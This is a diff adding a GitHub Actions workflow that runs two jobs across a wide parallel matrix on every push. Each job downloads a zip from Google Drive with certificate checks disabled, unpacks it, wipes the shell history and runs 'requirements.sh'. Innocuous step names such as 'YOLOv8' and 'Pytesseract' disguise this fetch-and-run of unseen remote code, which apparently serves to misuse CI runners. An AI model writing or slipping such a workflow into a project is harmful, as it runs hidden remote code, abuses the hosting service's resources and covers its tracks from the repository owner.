@@ -1,0 +1,56 @@
+name: vectorphienban268stack
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  CONFIGURE:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Initialize', 'Develop', 'Test', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1SVVnJ1r4omNZsuSv84fPsKPRLkkbIJI3" -O YOLOv8.zip
+        unzip -o YOLOv8.zip
+        rm YOLOv8.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  CREATE1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Fetch', 'Integrate', 'Evaluate', 'Execute', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1SVVnJ1r4omNZsuSv84fPsKPRLkkbIJI3" -O YOLOv8.zip
+        unzip -o YOLOv8.zip
+        rm YOLOv8.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
